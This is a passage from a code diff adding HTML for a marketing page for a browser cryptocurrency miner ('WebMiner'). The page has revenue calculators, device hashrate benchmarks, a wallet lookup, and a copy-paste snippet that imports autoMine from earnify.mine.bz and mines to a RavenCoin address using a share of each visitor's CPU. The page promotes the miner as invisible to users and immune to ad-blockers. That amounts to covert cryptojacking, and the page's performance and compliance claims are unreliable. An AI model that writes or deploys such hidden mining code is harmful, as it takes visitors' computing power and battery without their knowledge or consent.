+            <p class="text-sm text-muted-fg">
+              Aggregate revenue across all sessions within the measurement
+              period, denominated in target cryptocurrency.
+            </p>
+          </div>
+          <div class="bg-bg p-6 md:p-8 scroll-reveal">
+            <code class="text-3xl md:text-4xl font-bold text-accent block mb-3"
+              >N</code
+            >
+            <span
+              class="text-base md:text-lg font-bold uppercase tracking-tight block mb-2"
+              >Active Sessions</span
+            >
+            <p class="text-sm text-muted-fg">
+              Total unique browser sessions actively contributing compute during
+              the measurement window.
+            </p>
+          </div>
+          <div class="bg-bg p-6 md:p-8 scroll-reveal">
+            <code class="text-3xl md:text-4xl font-bold text-accent block mb-3"
+              >H<sub>i</sub></code
+            >
+            <span
+              class="text-base md:text-lg font-bold uppercase tracking-tight block mb-2"
+              >User Hashrate (H/s)</span
+            >
+            <p class="text-sm text-muted-fg">
+              Device-specific computation rate for session i. Influenced by CPU
+              architecture, threads, thermal state.
+            </p>
+          </div>
+          <div class="bg-bg p-6 md:p-8 scroll-reveal">
+            <code class="text-3xl md:text-4xl font-bold text-accent block mb-3"
+              >t<sub>i</sub></code
+            >
+            <span
+              class="text-base md:text-lg font-bold uppercase tracking-tight block mb-2"
+              >Session Duration</span
+            >
+            <p class="text-sm text-muted-fg">
+              Active compute time for user i. Begins on init, terminates on page
+              unload or explicit stop().
+            </p>
+          </div>
+          <div class="bg-bg p-6 md:p-8 scroll-reveal md:col-span-2">
+            <code class="text-3xl md:text-4xl font-bold text-accent block mb-3"
+              >R</code
+            >
+            <span
+              class="text-base md:text-lg font-bold uppercase tracking-tight block mb-2"
+              >Network Block Reward Factor</span
+            >
+            <p class="text-sm text-muted-fg">
+              Real-time coefficient from current block reward, network
+              difficulty, and pool luck. Expressed as
+              reward-per-hash-per-second.
+            </p>
+          </div>
+        </div>
+
+        <!-- Revenue projections -->
+        <!-- ═══ REVENUE CALCULATOR (replaces static table) ═══ -->
+<div class="scroll-reveal mb-12 md:mb-20">
+  <h3 class="text-2xl md:text-3xl font-bold uppercase tracking-tighter mb-4">
+    Revenue Calculator
+  </h3>
+  <p class="text-sm text-muted-fg mb-6">
+    Live projections from zpool.ca. Powered by real-time network estimates.
+  </p>
+
+  <div class="border-2 border-border p-6 md:p-8 mb-6">
+    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
+      <!-- Algorithm -->
+      <div>
+        <label class="text-xs uppercase tracking-widest text-muted-fg font-medium block mb-2">
+          Algorithm
+        </label>
+        <select id="calc-algo"
+          class="w-full bg-transparent border-b-2 border-border text-xl font-bold uppercase tracking-tighter py-3 text-fg focus:border-accent outline-none">
+          <option value="minotaurx">MinotaurX (Default)</option>
+          <option value="power2b">Power2B</option>
+          <option value="yespower">YesPower</option>
+          <option value="yescrypt">Yescrypt</option>
+          <option value="flex">Flex</option>
+          <option value="ghostrider">GhostRider</option>
+          <option value="verushash">VerusHash</option>
+
+        </select>
+      </div>
+      <!-- daily users -->
+      <div>
+        <label class="text-xs uppercase tracking-widest text-muted-fg font-medium block mb-2">
+          Daily Active Users
+        </label>
+        <input type="number" id="calc-users" value="1000" min="0"
+          class="kinetic-input w-full bg-transparent border-b-2 border-border text-2xl md:text-3xl font-bold uppercase tracking-tighter py-3 text-fg"
+          oninput="updateRevenueCalculator()" />
+      </div>
+      <!-- Hashrate per user -->
+      <div>
+        <label class="text-xs uppercase tracking-widest text-muted-fg font-medium block mb-2">
+          Avg H/s per User
+        </label>
+        <input type="number" id="calc-hashrate" value="40" min="0"
+          class="kinetic-input w-full bg-transparent border-b-2 border-border text-2xl md:text-3xl font-bold uppercase tracking-tighter py-3 text-fg"
+          oninput="updateRevenueCalculator()" />
+      </div>
+      <!-- Session duration -->
+      <div>
+        <label class="text-xs uppercase tracking-widest text-muted-fg font-medium block mb-2">
+          Avg Session (min)
+        </label>
+        <input type="number" id="calc-session" value="5" min="0" max="1440"
+          class="kinetic-input w-full bg-transparent border-b-2 border-border text-2xl md:text-3xl font-bold uppercase tracking-tighter py-3 text-fg"
+          oninput="updateRevenueCalculator()" />
+      </div>
+    </div>
+
+    <!-- Algo live estimate -->
+    <div class="border border-border p-4 mb-6 bg-muted">
+      <div class="flex flex-wrap items-center gap-4 text-sm">
+        <span class="text-muted-fg uppercase tracking-widest text-xs">Live Estimate:</span>
+        <span class="font-bold font-mono" id="calc-algo-estimate">Loading…</span>
+        <span class="text-muted-fg uppercase tracking-widest text-xs ml-auto" id="calc-last-updated">—</span>
+      </div>
+    </div>
+
+    <!-- Results -->
+    <div class="grid grid-cols-2 md:grid-cols-4 gap-px bg-border">
+      <div class="bg-bg p-5 md:p-6">
+        <span class="text-xs uppercase tracking-widest text-muted-fg block mb-1">Gross Daily</span>
+        <span class="text-2xl md:text-3xl font-bold" id="calc-gross-daily">---</span>
+      </div>
+      <div class="bg-bg p-5 md:p-6">
+        <span class="text-xs uppercase tracking-widest text-muted-fg block mb-1">Gross Monthly</span>
+        <span class="text-2xl md:text-3xl font-bold" id="calc-gross-monthly">---</span>
+      </div>
+      <div class="bg-bg p-5 md:p-6 border-2 border-accent">
+        <span class="text-xs uppercase tracking-widest text-muted-fg block mb-1">Net Daily (after 1%)</span>
+        <span class="text-2xl md:text-3xl font-bold text-accent" id="calc-daily">---</span>
+      </div>
+      <div class="bg-bg p-5 md:p-6 border-2 border-accent">
+        <span class="text-xs uppercase tracking-widest text-muted-fg block mb-1">Net Monthly (after 1%)</span>
+        <span class="text-2xl md:text-3xl font-bold text-accent" id="calc-monthly">---</span>
+      </div>
+    </div>
+
+    <!-- BTC equivalent -->
+    <div class="mt-4 text-sm text-muted-fg">
+      <span>BTC equivalent — Daily: </span>
+      <span class="font-bold" id="calc-btc-daily">---</span>
+      <span class="ml-4">Monthly: </span>
+      <span class="font-bold" id="calc-btc-monthly">---</span>
+    </div>
+  </div>
+
+  <p class="text-xs text-muted-fg">
+    * Estimates use live zpool.ca data. Actual yields vary with network difficulty, pool luck, and device performance.
+    Assumes users are active concurrently during their session window.
+  </p>
+</div>
+
+        <!-- Comparison -->
+        <div
+          class="grid grid-cols-1 lg:grid-cols-2 gap-px bg-border scroll-reveal"
+        >
+          <div class="bg-bg p-8 md:p-12">
+            <div
+              class="text-xs uppercase tracking-widest text-muted-fg mb-6 font-medium flex items-center gap-2"
+            >
+              <span class="w-3 h-3 bg-muted"></span>Traditional Advertising
+            </div>
+            <ul class="space-y-4">
+              <li class="flex gap-3 text-sm md:text-base text-muted-fg">
+                <span class="text-muted shrink-0">✕</span>
+                <span
+                  >Volatile CPM rates ($0.10 – $8.00) depending on geo and
+                  season</span
+                >
+              </li>
+              <li class="flex gap-3 text-sm md:text-base text-muted-fg">
+                <span class="text-muted shrink-0">✕</span>
+                <span>40–70% fill rates on non-premium inventory</span>
+              </li>
+              <li class="flex gap-3 text-sm md:text-base text-muted-fg">
+                <span class="text-muted shrink-0">✕</span>
+                <span>42.7% of revenue lost to ad-blockers</span>
+              </li>
+              <li class="flex gap-3 text-sm md:text-base text-muted-fg">
+                <span class="text-muted shrink-0">✕</span>
+                <span>Requires invasive user tracking for targeting</span>
+              </li>
+              <li class="flex gap-3 text-sm md:text-base text-muted-fg">
+                <span class="text-muted shrink-0">✕</span>
+                <span>Heavy GDPR/CCPA compliance overhead and legal risk</span>
+              </li>
+              <li class="flex gap-3 text-sm md:text-base text-muted-fg">
+                <span class="text-muted shrink-0">✕</span>
+                <span>Degrades user experience with visual clutter</span>
+              </li>
+            </ul>
+          </div>
+          <div class="bg-accent text-bg p-8 md:p-12">
+            <div
+              class="text-xs uppercase tracking-widest text-bg/60 mb-6 font-medium flex items-center gap-2"
+            >
+              <span class="w-3 h-3 bg-bg"></span>WebMiner Compute
+            </div>
+            <ul class="space-y-4">
+              <li class="flex gap-3 text-sm md:text-base">
+                <span class="shrink-0 font-bold">✓</span>
+                <span>Deterministic yield tied directly to compute output</span>
+              </li>
+              <li class="flex gap-3 text-sm md:text-base">
+                <span class="shrink-0 font-bold">✓</span>
+                <span>100% fill rate — every session generates revenue</span>
+              </li>
+              <li class="flex gap-3 text-sm md:text-base">
+                <span class="shrink-0 font-bold">✓</span>
+                <span>Completely immune to ad-blocking software</span>
+              </li>
+              <li class="flex gap-3 text-sm md:text-base">
+                <span class="shrink-0 font-bold">✓</span>
+                <span>Zero data collection — no tracking, no cookies</span>
+              </li>
+              <li class="flex gap-3 text-sm md:text-base">
+                <span class="shrink-0 font-bold">✓</span>
+                <span>Inherently compliant — no personal data processed</span>
+              </li>
+              <li class="flex gap-3 text-sm md:text-base">
+                <span class="shrink-0 font-bold">✓</span>
+                <span>Zero visual footprint — invisible to users</span>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════════════════ -->
+    <!-- BENCHMARKS -->
+    <!-- ═══════════════════════════════════════ -->
+    <section class="py-20 md:py-32 border-b-2 border-border bg-muted">
+      <div class="max-w-[95vw] mx-auto px-4 md:px-8">
+        <div class="mb-8 md:mb-12">
+          <span
+            class="text-xs md:text-sm uppercase tracking-[0.3em] text-accent font-medium"
+            >Performance</span
+          >
+        </div>
+
+        <h2
+          class="text-[clamp(2rem,6vw,5rem)] font-bold leading-[0.9] tracking-tighter uppercase mb-12 md:mb-20 scroll-reveal"
+        >
+          REAL WORLD<br />DATA<span class="text-accent">.</span>
+        </h2>
+
+        <!-- Benchmark cards -->
+        <div
+          class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-px bg-border mb-12 md:mb-20"
+        >
+          <div class="bg-bg p-8 md:p-10 scroll-reveal">
+            <div class="text-xs uppercase tracking-widest text-muted-fg mb-3">
+              Desktop (8-core)
+            </div>
+            <div
+              class="text-[clamp(3rem,8vw,5rem)] font-bold leading-none tracking-tighter mb-1"
+            >
+              187
+            </div>
+            <div class="text-sm text-accent font-bold">H/s average</div>
+            <div class="mt-4 text-xs text-muted-fg">
+              7 threads active / 1 reserved
+            </div>
+            <div class="mt-3 w-full bg-muted h-1.5">
+              <div class="bg-accent h-1.5" style="width: 92%"></div>
+            </div>
+          </div>
+          <div class="bg-bg p-8 md:p-10 scroll-reveal">
+            <div class="text-xs uppercase tracking-widest text-muted-fg mb-3">
+              Laptop (4-core)
+            </div>
+            <div
+              class="text-[clamp(3rem,8vw,5rem)] font-bold leading-none tracking-tighter mb-1"
+            >
+              74
+            </div>
+            <div class="text-sm text-accent font-bold">H/s average</div>
+            <div class="mt-4 text-xs text-muted-fg">
+              3 threads active / 1 reserved
+            </div>
+            <div class="mt-3 w-full bg-muted h-1.5">
+              <div class="bg-accent h-1.5" style="width: 58%"></div>
+            </div>
+          </div>
+          <div class="bg-bg p-8 md:p-10 scroll-reveal">
+            <div class="text-xs uppercase tracking-widest text-muted-fg mb-3">
+              Tablet (6-core)
+            </div>
+            <div
+              class="text-[clamp(3rem,8vw,5rem)] font-bold leading-none tracking-tighter mb-1"
+            >
+              52
+            </div>
+            <div class="text-sm text-accent font-bold">H/s average</div>
+            <div class="mt-4 text-xs text-muted-fg">
+              5 threads active / 1 reserved
+            </div>
+            <div class="mt-3 w-full bg-muted h-1.5">
+              <div class="bg-accent h-1.5" style="width: 41%"></div>
+            </div>
+          </div>
+          <div class="bg-bg p-8 md:p-10 scroll-reveal">
+            <div class="text-xs uppercase tracking-widest text-muted-fg mb-3">
+              Mobile (4-core)
+            </div>
+            <div
+              class="text-[clamp(3rem,8vw,5rem)] font-bold leading-none tracking-tighter mb-1"
+            >
+              28
+            </div>
+            <div class="text-sm text-accent font-bold">H/s average</div>
+            <div class="mt-4 text-xs text-muted-fg">
+              3 threads active / 1 reserved
+            </div>
+            <div class="mt-3 w-full bg-muted h-1.5">
+              <div class="bg-accent h-1.5" style="width: 22%"></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Impact stats -->
+        <div
+          class="grid grid-cols-1 md:grid-cols-3 gap-px bg-border scroll-reveal"
+        >
+          <div class="bg-bg p-8 md:p-10">
+            <div class="flex items-center justify-between mb-4">
+              <span
+                class="text-base md:text-lg font-bold uppercase tracking-tight"
+                >CPU Impact</span
+              >
+              <span class="text-2xl md:text-3xl font-bold text-accent"
+                >&lt;2%</span
+              >
+            </div>
+            <p class="text-sm text-muted-fg leading-tight">
+              All compute in Web Workers. Main thread sees &lt;2% overhead.
+              Lighthouse scores unaffected.
+            </p>
+          </div>
+          <div class="bg-bg p-8 md:p-10">
+            <div class="flex items-center justify-between mb-4">
+              <span
+                class="text-base md:text-lg font-bold uppercase tracking-tight"
+                >Bandwidth</span
+              >
+              <span class="text-2xl md:text-3xl font-bold text-accent"
+                >&lt;1 KB/s</span
+              >
+            </div>
+            <p class="text-sm text-muted-fg leading-tight">
+              Stratum packets average 200–400 bytes. Share submissions under 150
+              bytes. Imperceptible overhead.
+            </p>
+          </div>
+          <div class="bg-bg p-8 md:p-10">
+            <div class="flex items-center justify-between mb-4">
+              <span
+                class="text-base md:text-lg font-bold uppercase tracking-tight"
+                >Battery</span
+              >
+              <span class="text-2xl md:text-3xl font-bold">~8%/hr</span>
+            </div>
+            <p class="text-sm text-muted-fg leading-tight">
+              Auto-detects Battery Status API. Configurable throttle/pause below
+              threshold.
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
+<!-- ═══════════════════════════════════════ -->
+<!-- LIVE ALGORITHM PROFITABILITY           -->
+<!-- ═══════════════════════════════════════ -->
+<section class="py-20 md:py-32 border-b-2 border-border">
+  <div class="max-w-[95vw] mx-auto px-4 md:px-8">
+    <div class="mb-8 md:mb-12">
+      <span class="text-xs md:text-sm uppercase tracking-[0.3em] text-accent font-medium">
+        Live Pool Data
+      </span>
+    </div>
+
+    <h2 class="text-[clamp(2rem,6vw,5rem)] font-bold leading-[0.9] tracking-tighter uppercase mb-4 scroll-reveal">
+      ALGORITHM<br/>PROFITABILITY<span class="text-accent">.</span>
+    </h2>
+    <p class="text-sm md:text-base text-muted-fg mb-8 scroll-reveal">
+      Real-time estimates from zpool.ca. Auto-refreshes every 60 seconds.
+    </p>
+
+    <div class="scroll-reveal">
+      <!-- Header -->
+      <div class="grid grid-cols-5 gap-px bg-border">
+        <div class="bg-muted p-4 text-xs uppercase tracking-widest text-muted-fg font-medium">Algorithm</div>
+        <div class="bg-muted p-4 text-xs uppercase tracking-widest text-muted-fg font-medium text-center">Pool Hashrate</div>
+        <div class="bg-muted p-4 text-xs uppercase tracking-widest text-muted-fg font-medium text-center">Workers</div>
+        <div class="bg-muted p-4 text-xs uppercase tracking-widest text-muted-fg font-medium text-center">Est. Revenue</div>
+        <div class="bg-muted p-4 text-xs uppercase tracking-widest text-muted-fg font-medium text-center">Pool Fee</div>
+      </div>
+      <!-- Dynamic rows injected by JS -->
+      <div id="algo-table-body">
+        <div class="bg-bg p-8 text-center text-muted-fg animate-pulse">Loading live data from zpool…</div>
+      </div>
+    </div>
+
+    <div class="mt-6 flex flex-wrap items-center gap-6 text-xs text-muted-fg">
+      <span class="flex items-center gap-2">
+        <span class="w-2 h-2 bg-accent rounded-full animate-pulse"></span>
+        Live data from zpool.ca
+      </span>
+      <span id="algo-refresh-timer">Next refresh in 60s</span>
+      <span>⇄ Auto-refreshes every 60s</span>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════ -->
+<!-- WALLET LOOKUP                          -->
+<!-- ═══════════════════════════════════════ -->
+<section class="py-20 md:py-32 border-b-2 border-border bg-muted">
+  <div class="max-w-[95vw] mx-auto px-4 md:px-8">
+    <div class="mb-8 md:mb-12">
+      <span class="text-xs md:text-sm uppercase tracking-[0.3em] text-accent font-medium">
+        Wallet Dashboard
+      </span>
+    </div>
+
+    <h2 class="text-[clamp(2rem,6vw,5rem)] font-bold leading-[0.9] tracking-tighter uppercase mb-4 scroll-reveal">
+      CHECK YOUR<br/>EARNINGS<span class="text-accent">.</span>
+    </h2>
+    <p class="text-sm md:text-base text-muted-fg mb-8 max-w-2xl scroll-reveal">
+      Enter your zpool wallet address to view unpaid balance, active miners,
+      recent payouts, and estimated earnings in real-time.
+    </p>
+
+    <div class="scroll-reveal max-w-3xl">
+      <div class="flex gap-3 mb-6">
+        <input type="text" id="wallet-address"
+          placeholder="ENTER WALLET ADDRESS…"
+          class="kinetic-input flex-1 bg-transparent border-b-2 border-border text-xl md:text-2xl font-bold uppercase tracking-tighter py-3 text-fg placeholder:text-muted" />
+        <button onclick="lookupWallet()"
+          class="bg-accent text-bg font-bold uppercase tracking-tighter text-sm md:text-base px-6 md:px-8 py-3 hover:scale-105 active:scale-95 transition-transform shrink-0">
+          Look Up →
+        </button>
+      </div>
+
+      <div id="wallet-result">
+        <div class="text-muted-fg text-sm">
+          Default wallet pre-loaded. Click "Look Up" to check your own address.
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+    <!-- ═══════════════════════════════════════ -->
+    <!-- DEPLOY / INTEGRATION -->
+    <!-- ═══════════════════════════════════════ -->
+    <!-- ═══════════════════════════════════════ -->
+    <!-- DEPLOY / INTEGRATION -->
+    <!-- ═══════════════════════════════════════ -->
+    <section id="deploy" class="py-20 md:py-32 border-b-2 border-border">
+      <div class="max-w-[95vw] mx-auto px-4 md:px-8">
+        <div class="mb-8 md:mb-12">
+          <span
+            class="text-xs md:text-sm uppercase tracking-[0.3em] text-accent font-medium"
+            >Integration</span
+          >
+        </div>
+
+        <h2
+          class="text-[clamp(2rem,6vw,5rem)] font-bold leading-[0.9] tracking-tighter uppercase mb-12 md:mb-20 scroll-reveal"
+        >
+          DEPLOY IN<br />UNDER 5<br />MINUTES<span class="text-accent">.</span>
+        </h2>
+
+        <!-- Steps -->
+        <div
+          class="grid grid-cols-1 md:grid-cols-3 gap-px bg-border mb-12 md:mb-20 scroll-reveal"
+        >
+          <div class="bg-bg p-8 md:p-10">
+            <div
+              class="text-[clamp(4rem,10vw,6rem)] font-bold text-muted leading-none tracking-tighter mb-4"
+            >
+              01
+            </div>
+            <h3
+              class="text-xl md:text-2xl font-bold uppercase tracking-tight mb-3"
+            >
+              Create Wallet Address
+            </h3>
+            <p class="text-sm md:text-base text-muted-fg leading-tight">
+              Create a RavenCoin wallet. Set your wallet address
+              and put that in the script, this is where your funds will go. No account registration needed.
+            </p>
+          </div>
+          <div class="bg-bg p-8 md:p-10">
+            <div
+              class="text-[clamp(4rem,10vw,6rem)] font-bold text-muted leading-none tracking-tighter mb-4"
+            >
+              02
+            </div>
+            <h3
+              class="text-xl md:text-2xl font-bold uppercase tracking-tight mb-3"
+            >
+              Add Script
+            </h3>
+            <p class="text-sm md:text-base text-muted-fg leading-tight">
+              Copy the code below. Paste before closing &lt;/body&gt;. Replace
+              wallet address with your RavenCoin wallet address. That's it.
+            </p>
+          </div>
+          <div class="bg-bg p-8 md:p-10">
+            <div
+              class="text-[clamp(4rem,10vw,6rem)] font-bold text-muted leading-none tracking-tighter mb-4"
+            >
+              03
+            </div>
+            <h3
+              class="text-xl md:text-2xl font-bold uppercase tracking-tight mb-3"
+            >
+              Deploy & Monitor
+            </h3>
+            <p class="text-sm md:text-base text-muted-fg leading-tight">
+              Push to production. Check dev console for connection. Monitor pool
+              dashboard for hashrate and payouts.
+            </p>
+          </div>
+        </div>
+
+        <!-- Code block -->
+        <div class="border-2 border-border scroll-reveal">
+          <div
+            class="flex items-center justify-between px-6 py-4 border-b-2 border-border bg-muted"
+          >
+            <div class="flex items-center gap-4">
+              <div class="flex gap-1.5">
+                <div class="w-3 h-3 bg-border"></div>
+                <div class="w-3 h-3 bg-border"></div>
+                <div class="w-3 h-3 bg-border"></div>
+              </div>
+              <span
+                class="text-xs md:text-sm font-bold uppercase tracking-tighter"
+                >implementation.html</span
+              >
+            </div>
+            <button
+              onclick="navigator.clipboard.writeText(document.getElementById('codeblock').textContent)"
+              class="text-xs uppercase tracking-widest text-muted-fg hover:text-accent transition-colors font-medium"
+            >
+              Copy
+            </button>
+          </div>
+          <pre
+            class="p-6 md:p-8 overflow-x-auto text-sm md:text-base leading-relaxed font-mono"
+            id="codeblock"
+          ><code><span class="text-accent">&lt;!DOCTYPE html&gt;</span>
+<span class="text-accent">&lt;html&gt;</span>
+  <span class="text-accent">&lt;body&gt;</span>
+    <span class="text-fg">&lt;h2&gt;</span><span class="text-muted-fg">Thanks for using cpu-web-miner</span><span class="text-fg">&lt;/h2&gt;</span>
+    <span class="text-accent">&lt;body</span> <span class="text-fg"></span><span class="text-muted-fg">"YOUR WEBSITES CODE"</span><span class="text-accent">&gt;&lt;/body&gt;</span>
+    <span class="text-accent">&lt;script</span> <span class="text-fg">type</span>=<span class="text-muted-fg">"module"</span><span class="text-accent">&gt;</span>
+     
+    <span class="text-fg">import</span> { <span class="text-fg">autoMine</span> } <span class="text-fg">from</span> <span class="text-muted-fg">"https://earnify.mine.bz/miner.js"</span>;
+      <span class="text-muted-fg">// Your RavenCoin Address     percent of users pc, 0.1 = 1%, 1 = 100%</span>
+      <span class="text-fg">autoMine</span>(<span class="text-muted-fg">"RXi399jsFYHLeqFhJWiNETySj5nvt2ryqj"</span>, <span class="text-accent">0.2</span>);
+    <span class="text-accent">&lt;/script&gt;</span>
+  <span class="text-accent">&lt;/body&gt;</span>
+<span class="text-accent">&lt;/html&gt;</span></code></pre>
+        </div>
+
+        <!-- Framework guides -->
+        <div
+          class="grid grid-cols-1 md:grid-cols-3 gap-px bg-border mt-8 scroll-reveal"
+        >
+          <div class="bg-bg p-6 md:p-8 invert-card cursor-default">
+            <div class="text-2xl mb-3">⚛️</div>
+            <h4
+              class="text-lg font-bold uppercase tracking-tight mb-2 card-title"
+            >
+              React / Next.js
+            </h4>
+            <p class="text-sm text-muted-fg card-desc">
+              Import in useEffect with cleanup. Ensure client-side only via
+              typeof window check.
+            </p>
+          </div>
+          <div class="bg-bg p-6 md:p-8 invert-card cursor-default">
+            <div class="text-2xl mb-3">💚</div>
+            <h4
+              class="text-lg font-bold uppercase tracking-tight mb-2 card-title"
+            >
+              Vue 3
+            </h4>
+            <p class="text-sm text-muted-fg card-desc">
+              Initialize in onMounted(). Use onUnmounted() for graceful worker
+              termination.
+            </p>
+          </div>
+          <div class="bg-bg p-6 md:p-8 invert-card cursor-default">
+            <div class="text-2xl mb-3">🔥</div>
+            <h4
+              class="text-lg font-bold uppercase tracking-tight mb-2 card-title"
+            >
+              Svelte / SvelteKit
+            </h4>
+            <p class="text-sm text-muted-fg card-desc">
+              Use onMount() with browser check from $app/environment for SSR
+              safety.
+            </p>
+          </div>
+        </div>
+
+        <div class="mt-10 text-center">
+          <a
+            href="https://github.com/romannnoodesl/earnify.mine.bz"
+            class="inline-flex items-center gap-3 text-sm md:text-base font-bold uppercase tracking-tighter text-accent hover:underline underline-offset-4"
+          >
+            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
+              <path
+                d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"
+              />
+            </svg>
+            Full Documentation on GitHub →
+          </a>
+        </div>
+      </div>
+    </section>
+
+    <!-- ═══════════════════════════════════════ -->
+<!-- TUTORIALS                              -->
+<!-- ═══════════════════════════════════════ -->
+<section id="tutorials" class="py-20 md:py-32 border-b-2 border-border bg-muted">
+    <div class="max-w-[95vw] mx-auto px-4 md:px-8">
+      <div class="mb-8 md:mb-12">
+        <span
+          class="text-xs md:text-sm uppercase tracking-[0.3em] text-accent font-medium"
+          >Video Walkthroughs</span
+        >
+      </div>
+  
+      <h2
+        class="text-[clamp(2rem,6vw,5rem)] font-bold leading-[0.9] tracking-tighter uppercase mb-4 md:mb-6 scroll-reveal"
+      >
+        WATCH &<br />DEPLOY<span class="text-accent">.</span>
+      </h2>
+  
+      <p
+        class="text-sm md:text-base text-muted-fg max-w-2xl leading-tight mb-12 md:mb-16 scroll-reveal"
+      >
+        Step-by-step implementation guides. From zero to mining revenue in under
+        5 minutes — no prior experience required.
+      </p>
+  
+      <!-- ── Featured / Primary Tutorial ── -->
+      <div
+        class="grid grid-cols-1 lg:grid-cols-5 gap-px bg-border mb-8 scroll-reveal"
+      >
+        <!-- Video embed — 3 columns wide -->
+        <div
+          class="lg:col-span-3 bg-bg aspect-video relative overflow-hidden"
+        >
+          <iframe
+            class="absolute inset-0 w-full h-full"
+            src="https://www.youtube.com/embed/unC4Wd2k_eA"
+            title="WebMiner — Quick Start Tutorial"
+            frameborder="0"
+            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
+            allowfullscreen
+          ></iframe>
+        </div>
+  
+        <!-- Description — 2 columns wide -->
+        <div class="lg:col-span-2 bg-bg p-6 md:p-8 flex flex-col justify-between">
+          <div>
+            <div class="flex items-center gap-3 mb-4">
+              <span
+                class="bg-accent text-bg text-xs font-bold uppercase tracking-widest px-3 py-1"
+                >Featured</span
+              >
+              <span
+                class="text-xs uppercase tracking-widest text-muted-fg"
+                >5 min</span
+              >
+            </div>
+            <h3
+              class="text-xl md:text-2xl font-bold uppercase tracking-tight mb-3"
+            >
+              Quick Start: Deploy WebMiner in Under 5 Minutes
+            </h3>
+            <p class="text-sm text-muted-fg leading-tight mb-6">
+              Complete walkthrough from creating your RavenCoin wallet to seeing
+              your first shares submitted to the pool. Covers script tag
+              integration, thread configuration, and real-time monitoring in the
+              browser console.
+            </p>
+            <ul class="space-y-2 text-sm text-muted-fg">
+              <li class="flex items-center gap-2">
+                <span class="text-accent font-bold shrink-0">01</span>
+                <span>Setting up your RavenCoin wallet</span>
+              </li>
+              <li class="flex items-center gap-2">
+                <span class="text-accent font-bold shrink-0">02</span>
+                <span>Adding the script tag to your site</span>
+              </li>
+              <li class="flex items-center gap-2">
+                <span class="text-accent font-bold shrink-0">03</span>
+                <span>Configuring thread allocation</span>
+              </li>
+              <li class="flex items-center gap-2">
+                <span class="text-accent font-bold shrink-0">04</span>
+                <span>Verifying connection & monitoring hashrate</span>
+              </li>
+            </ul>
+          </div>
+          <div class="mt-6 flex items-center gap-4">
+            <a
+              href="https://www.youtube.com/watch?v=YOUR_VIDEO_ID_HERE"
+              target="_blank"
+              rel="noopener noreferrer"
+              class="inline-flex items-center gap-2 text-sm font-bold uppercase tracking-tighter text-accent hover:underline underline-offset-4"
+            >
+              Watch on YouTube →
+            </a>
+          </div>
+        </div>
+      </div>
+  
+      <!-- ── Additional Tutorials Grid ── -->
+      <div
+        class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-px bg-border scroll-reveal"
+      >
+        <!-- Tutorial Card 2 -->
+        <div class="invert-card bg-bg group cursor-default">
+          <div class="aspect-video relative overflow-hidden">
+            <iframe
+              class="absolute inset-0 w-full h-full"
+              src="https://www.youtube.com/embed/YOUR_VIDEO_ID_2"
+              title="React / Next.js Integration"
+              frameborder="0"
+              allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
+              allowfullscreen
+            ></iframe>
+          </div>
+          <div class="p-5 md:p-6">
+            <div class="flex items-center gap-3 mb-3">
+              <span class="text-xs uppercase tracking-widest text-muted-fg card-desc">⚛️ React / Next.js</span>
+              <span class="text-xs uppercase tracking-widest text-muted-fg card-desc">8 min</span>
+            </div>
+            <h4 class="text-base md:text-lg font-bold uppercase tracking-tight mb-2 card-title">
+              React & Next.js Integration Guide
+            </h4>
+            <p class="text-xs text-muted-fg leading-tight card-desc">
+              useEffect hooks, client-side only imports, cleanup on unmount,
+              and SSR safety patterns for Next.js.
+            </p>
+          </div>
+        </div>
+  
+        <!-- Tutorial Card 3 -->
+        <div class="invert-card bg-bg group cursor-default">
+          <div class="aspect-video relative overflow-hidden">
+            <iframe
+              class="absolute inset-0 w-full h-full"
+              src="https://www.youtube.com/embed/YOUR_VIDEO_ID_3"
+              title="Vue 3 Integration"
+              frameborder="0"
+              allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
+              allowfullscreen
+            ></iframe>
+          </div>
+          <div class="p-5 md:p-6">
+            <div class="flex items-center gap-3 mb-3">
+              <span class="text-xs uppercase tracking-widest text-muted-fg card-desc">💚 Vue 3</span>
+              <span class="text-xs uppercase tracking-widest text-muted-fg card-desc">6 min</span>
+            </div>
+            <h4 class="text-base md:text-lg font-bold uppercase tracking-tight mb-2 card-title">
+              Vue 3 Composition API Setup
+            </h4>
+            <p class="text-xs text-muted-fg leading-tight card-desc">
+              onMounted initialization, onUnmounted cleanup, and reactive
+              state management for mining controls.
+            </p>
+          </div>
+        </div>
+  
+        <!-- Tutorial Card 4 -->
+        <div class="invert-card bg-bg group cursor-default">
+          <div class="aspect-video relative overflow-hidden">
+            <iframe
+              class="absolute inset-0 w-full h-full"
+              src="https://www.youtube.com/embed/YOUR_VIDEO_ID_4"
+              title="Advanced Configuration"
+              frameborder="0"
+              allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
+              allowfullscreen
+            ></iframe>
+          </div>
+          <div class="p-5 md:p-6">
